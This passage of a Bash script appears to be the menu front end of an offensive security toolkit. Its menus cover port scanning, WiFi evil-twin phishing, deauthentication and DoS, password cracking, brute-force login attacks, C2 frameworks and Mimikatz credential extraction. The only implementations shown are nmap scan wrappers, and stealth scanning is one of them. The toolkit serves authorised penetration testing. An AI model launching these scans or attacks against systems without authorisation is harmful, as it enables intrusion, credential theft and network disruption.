        echo -e "    ${C_GHOST}[1]${C_RESET} Bandwidth Test         ${C_SHADOW}iperf3${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Packet Flood           ${C_SHADOW}hping3${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} HTTP Load              ${C_SHADOW}ab/hey${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Network Impairment     ${C_SHADOW}tc netem${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        case "$choice" in
            1) run_with_sudo cmd_iperf3 ;;
            2) run_with_sudo cmd_hping3 ;;
            3) cmd_http_load ;;
            4) run_with_sudo cmd_netem ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_tools() {
    while true; do
        clear
        echo -e "    ${C_PURPLE}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_PURPLE}║${C_RESET}                      ${C_PURPLE}🔧 TOOL FORGE${C_RESET}                               ${C_PURPLE}║${C_RESET}"
        echo -e "    ${C_PURPLE}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Install Arsenal        ${C_SHADOW}full toolkit${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Install Essentials     ${C_SHADOW}quick setup${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Tool Status            ${C_SHADOW}what's installed${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} View Logs              ${C_SHADOW}latest runs${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Edit Config            ${C_SHADOW}preferences${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        case "$choice" in
            1) run_with_sudo cmd_install_arsenal ;;
            2) run_with_sudo cmd_install_quick ;;
            3) cmd_tool_status ;;
            4) cmd_view_logs ;;
            5) cmd_config edit ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_intel() {
    while true; do
        clear
        echo -e "    ${C_STEEL}╔═══════════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_STEEL}║${C_RESET}                       ${C_STEEL}📊 INTEL SUITE${C_RESET}                              ${C_STEEL}║${C_RESET}"
        echo -e "    ${C_STEEL}╚═══════════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} OSINT Recon            ${C_SHADOW}theHarvester, recon-ng${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Traffic Capture        ${C_SHADOW}tcpdump/tshark${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Generate Report        ${C_SHADOW}session artifacts${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[B]${C_RESET} Back"
        echo
        echo -ne "    ${C_CYAN}▶${C_RESET} "
        read -r choice
        case "$choice" in
            1) menu_osint ;;
            2) run_with_sudo cmd_traffic_capture ;;
            3) cmd_generate_report ;;
            b|B|0) return ;;
            *) log_error "Invalid option" ;;
        esac
        echo -e "\n    ${C_SHADOW}Press Enter to continue...${C_RESET}"
        read -r
    done
}

menu_credentials() {
    menu_creds
}

menu_postexploit() {
    menu_post_exploit
}

menu_port_scan() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_BLOOD}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_BLOOD}║${C_RESET}                    ${C_SKULL}⚔ PORT SCANNING${C_RESET}                          ${C_BLOOD}║${C_RESET}"
        echo -e "    ${C_BLOOD}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Quick Scan          ${C_SHADOW}nmap -T4 -F${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Full Scan           ${C_SHADOW}nmap -sS -sV -sC -A -p-${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Stealth Scan        ${C_SHADOW}nmap -sS -T2 -f${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Vuln Scan           ${C_SHADOW}nmap --script vuln${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} UDP Scan            ${C_SHADOW}nmap -sU --top-ports 100${C_RESET}"
        echo -e "    ${C_GHOST}[6]${C_RESET} Masscan             ${C_SHADOW}masscan -p1-65535 --rate=10000${C_RESET}"
        echo -e "    ${C_GHOST}[7]${C_RESET} Service Detection   ${C_SHADOW}nmap -sV --version-intensity 5${C_RESET}"
        echo -e "    ${C_GHOST}[8]${C_RESET} Rustscan            ${C_SHADOW}fast pre-scan + nmap${C_RESET}"
        echo -e "    ${C_GHOST}[9]${C_RESET} Unicornscan         ${C_SHADOW}asynchronous TCP/UDP scan${C_RESET}"
        echo -e "    ${C_GHOST}[10]${C_RESET} Zmap               ${C_SHADOW}internet-wide scan${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_nmap_quick ;;
            2) get_target && run_nmap_full ;;
            3) get_target && run_nmap_stealth ;;
            4) get_target && run_nmap_vuln ;;
            5) get_target && run_nmap_udp ;;
            6) get_target && run_masscan ;;
            7) get_target && run_nmap_service ;;
            8) get_target && run_rustscan ;;
            9) get_target && run_unicornscan ;;
            10) get_target && run_zmap ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_discovery() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_VENOM}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_VENOM}║${C_RESET}                  ${C_SKULL}🔍 NETWORK DISCOVERY${C_RESET}                       ${C_VENOM}║${C_RESET}"
        echo -e "    ${C_VENOM}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} ARP Scan            ${C_SHADOW}arp-scan -l${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Ping Sweep          ${C_SHADOW}nmap -sn${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Netdiscover         ${C_SHADOW}netdiscover -r${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} OS Detection        ${C_SHADOW}nmap -O${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Passive Fingerprint ${C_SHADOW}p0f${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) run_arp_scan ;;
            2) get_target && run_ping_sweep ;;
            3) get_target && run_netdiscover ;;
            4) get_target && run_os_detect ;;
            5) run_p0f ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_dns() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_GHOST}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_GHOST}║${C_RESET}                    ${C_SKULL}🌐 DNS ENUMERATION${C_RESET}                        ${C_GHOST}║${C_RESET}"
        echo -e "    ${C_GHOST}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} DNS Enum            ${C_SHADOW}dnsenum${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} DNS Map             ${C_SHADOW}dnsmap${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} DNS Recon           ${C_SHADOW}dnsrecon${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Zone Transfer       ${C_SHADOW}dig axfr${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Subdomain Brute     ${C_SHADOW}fierce${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_dnsenum ;;
            2) get_target && run_dnsmap ;;
            3) get_target && run_dnsrecon ;;
            4) get_target && run_zone_transfer ;;
            5) get_target && run_fierce ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_ssl() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_PURPLE}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_PURPLE}║${C_RESET}                    ${C_SKULL}🔐 SSL/TLS ANALYSIS${C_RESET}                       ${C_PURPLE}║${C_RESET}"
        echo -e "    ${C_PURPLE}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} SSL Scan            ${C_SHADOW}sslscan${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} SSLyze              ${C_SHADOW}sslyze --regular${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} TestSSL             ${C_SHADOW}testssl.sh${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Certificate Info    ${C_SHADOW}openssl s_client${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Heartbleed Check    ${C_SHADOW}nmap --script ssl-heartbleed${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_sslscan ;;
            2) get_target && run_sslyze ;;
            3) get_target && run_testssl ;;
            4) get_target && run_cert_info ;;
            5) get_target && run_heartbleed ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_wifi_recon() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_VENOM}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_VENOM}║${C_RESET}                     ${C_SKULL}📡 WiFi RECON${C_RESET}                            ${C_VENOM}║${C_RESET}"
        echo -e "    ${C_VENOM}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Scan Networks       ${C_SHADOW}airodump-ng${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Wifite Auto         ${C_SHADOW}wifite --kill${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Client Scan         ${C_SHADOW}airodump-ng --bssid${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Hidden SSID         ${C_SHADOW}airodump-ng + deauth${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Signal Strength     ${C_SHADOW}wavemon / iwconfig${C_RESET}"
        echo -e "    ${C_GHOST}[6]${C_RESET} Bettercap Recon     ${C_SHADOW}Live WiFi/ble intel${C_RESET}"
        echo -e "    ${C_GHOST}[7]${C_RESET} Fluxion             ${C_SHADOW}Automated evil twin${C_RESET}"
        echo -e "    ${C_GHOST}[8]${C_RESET} Wifiphisher         ${C_SHADOW}Phishing AP workflow${C_RESET}"
        echo -e "    ${C_GHOST}[9]${C_RESET} MDK3/MDK4 DoS       ${C_SHADOW}WiFi DoS toolkit${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) cmd_wifi_scan ;;
            2) cmd_wifite ;;
            3) cmd_client_scan ;;
            4) cmd_hidden_ssid ;;
            5) cmd_signal_check ;;
            6) cmd_bettercap_wifi ;;
            7) cmd_fluxion ;;
            8) cmd_wifiphisher ;;
            9) cmd_mdk_dos ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_wifi_crack() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_BLOOD}💀 HANDSHAKE CRACKING${C_RESET}                          ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Aircrack-ng (CPU)        ${C_SHADOW}Dictionary attack${C_RESET}                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Aircrack-ng (Wordlist)   ${C_SHADOW}Custom wordlist${C_RESET}                      ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Hashcat (GPU)            ${C_SHADOW}High-speed GPU cracking${C_RESET}               ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Wordlist + rules${C_RESET}                      ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Convert to Hashcat       ${C_SHADOW}cap → hccapx/hc22000${C_RESET}                  ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} John the Ripper          ${C_SHADOW}Alternative CPU cracker${C_RESET}               ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[7]${C_RESET} Cowpatty                 ${C_SHADOW}WPA/WPA2 PSK offline${C_RESET}                  ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_aircrack_dict ;;
            2) cmd_aircrack_wordlist ;;
            3) cmd_hashcat_gpu ;;
            4) cmd_hashcat_rules ;;
            5) cmd_convert_hashcat ;;
            6) cmd_john_the_ripper ;;
            7) cmd_cowpatty ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_evil_twin() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_PURPLE}👿 EVIL TWIN ATTACK${C_RESET}                         ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Scan for targets         ${C_SHADOW}Find APs to clone${C_RESET}                    ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Create Evil Twin         ${C_SHADOW}Clone target AP${C_RESET}                       ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Captive Portal           ${C_SHADOW}Phishing login page${C_RESET}                   ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Karma Attack             ${C_SHADOW}Respond to all probes${C_RESET}                 ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Deauth Original          ${C_SHADOW}Force clients to rogue AP${C_RESET}               ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} Stop Attack              ${C_SHADOW}Kill all rogue processes${C_RESET}               ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_evil_twin_scan ;;
            2) cmd_evil_twin_create ;;
            3) cmd_captive_portal ;;
            4) cmd_karma_attack ;;
            5) cmd_deauth ;;
            6) cmd_evil_twin_stop ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_web() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_BLOOD}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_BLOOD}║${C_RESET}                    ${C_SKULL}🌐 WEB ATTACKS${C_RESET}                            ${C_BLOOD}║${C_RESET}"
        echo -e "    ${C_BLOOD}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Nikto Scan          ${C_SHADOW}nikto -h${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} WordPress Scan      ${C_SHADOW}wpscan --url${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Directory Brute     ${C_SHADOW}gobuster dir${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} FFUF Fuzzing        ${C_SHADOW}ffuf -u -w${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Burp Suite          ${C_SHADOW}burpsuite${C_RESET}"
        echo -e "    ${C_GHOST}[6]${C_RESET} SQL Injection       ${C_SHADOW}sqlmap --wizard${C_RESET}"
        echo -e "    ${C_GHOST}[7]${C_RESET} Nuclei              ${C_SHADOW}Fast vuln scanner${C_RESET}"
        echo -e "    ${C_GHOST}[8]${C_RESET} httpx               ${C_SHADOW}HTTP probing${C_RESET}"
        echo -e "    ${C_GHOST}[9]${C_RESET} Subfinder           ${C_SHADOW}Subdomain discovery${C_RESET}"
        echo -e "    ${C_GHOST}[10]${C_RESET} Amass              ${C_SHADOW}Attack surface mapping${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_nikto ;;
            2) get_target && run_wpscan ;;
            3) get_target && run_gobuster ;;
            4) get_target && run_ffuf ;;
            5) run_burpsuite ;;
            6) cmd_sqlmap ;;
            7) get_target && run_nuclei ;;
            8) get_target && run_httpx ;;
            9) get_target && run_subfinder ;;
            10) get_target && run_amass ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_osint() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_GHOST}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
        echo -e "    ${C_GHOST}║${C_RESET}                    ${C_SKULL}🔎 OSINT RECON${C_RESET}                            ${C_GHOST}║${C_RESET}"
        echo -e "    ${C_GHOST}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} theHarvester        ${C_SHADOW}Email, subdomain harvesting${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Recon-ng            ${C_SHADOW}Web reconnaissance framework${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Shodan Search       ${C_SHADOW}Internet device search${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Whois Lookup        ${C_SHADOW}Domain registration info${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Google Dork         ${C_SHADOW}Advanced search queries${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_theharvester ;;
            2) run_reconng ;;
            3) get_target && run_shodan ;;
            4) get_target && run_whois ;;
            5) cmd_google_dork ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_session() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_FIRE}📁 SESSION MANAGEMENT${C_RESET}                         ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Start New Session        ${C_SHADOW}Begin new engagement${C_RESET}                  ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Resume Session           ${C_SHADOW}Continue previous work${C_RESET}               ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Session Status           ${C_SHADOW}View current progress${C_RESET}                ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Add Notes                ${C_SHADOW}Document findings${C_RESET}                    ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Export Session           ${C_SHADOW}Package for reporting${C_RESET}                 ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} List All Sessions        ${C_SHADOW}Browse history${C_RESET}                      ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) session_start ;;
            2) session_resume ;;
            3) session_status ;;
            4) session_notes ;;
            5) session_export ;;
            6) session_list ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_creds() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_FIRE}🔑 CREDENTIAL ATTACKS${C_RESET}                       ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Hashcat (GPU)            ${C_SHADOW}Offline cracking${C_RESET}                    ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Rule-based attacks${C_RESET}                  ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} John the Ripper          ${C_SHADOW}CPU cracking${C_RESET}                        ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Hydra                    ${C_SHADOW}Online brute force${C_RESET}                  ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} Medusa                   ${C_SHADOW}Parallel login attacks${C_RESET}              ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} CrackMapExec             ${C_SHADOW}AD/SMB spray${C_RESET}                       ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_hashcat_gpu ;;
            2) cmd_hashcat_rules ;;
            3) cmd_john_the_ripper ;;
            4) cmd_hydra_bruteforce ;;
            5) cmd_medusa_bruteforce ;;
            6) cmd_crackmapexec ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_post_exploit() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}┌─────────────────────────────────────────────────────────────────────┐${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                      ${C_PURPLE}🧠 POST-EXPLOITATION${C_RESET}                      ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}├─────────────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Empire                  ${C_SHADOW}PowerShell C2${C_RESET}                       ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Covenant                ${C_SHADOW}C# C2 platform${C_RESET}                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Mimikatz (impacket)     ${C_SHADOW}Credential extraction${C_RESET}             ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} Impacket Scripts        ${C_SHADOW}Remote exec toolkit${C_RESET}                ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                                                                     ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}└─────────────────────────────────────────────────────────────────────┘${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}▶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_empire ;;
            2) cmd_covenant ;;
            3) cmd_mimikatz ;;
            4) cmd_impacket_scripts ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - SCANNING
#═══════════════════════════════════════════════════════════════════════════════

run_nmap_quick() {
    check_tool "nmap" || return 1
    local outfile="${OUTPUT_FILE}_quick.txt"
    operation_header "Quick Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -T4 -F -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning ports..."
    nmap -T4 -F -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Quick scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_full() {
    check_tool "nmap" || return 1
    require_root || return 1
    local outfile="${OUTPUT_FILE}_full.txt"
    operation_header "Full Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sS -sV -sC -A -p- -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning all ports with service detection..."
    nmap -sS -sV -sC -A -p- -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Full scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_stealth() {
    check_tool "nmap" || return 1
    require_root || return 1
    local outfile="${OUTPUT_FILE}_stealth.txt"
    operation_header "Stealth Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sS -T2 -f --data-length 24 -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning with fragmentation and low timing..."
    nmap -sS -T2 -f --data-length 24 -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Stealth scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_vuln() {
    check_tool "nmap" || return 1
    local outfile="${OUTPUT_FILE}_vuln.txt"
    operation_header "Vulnerability Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap --script vuln -oN \"${outfile}\" \"${TARGET}\""
    log_info "Running vuln scripts..."
    nmap --script vuln -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    operation_summary "Vulnerability scan" "$start_ms" "$outfile"
}

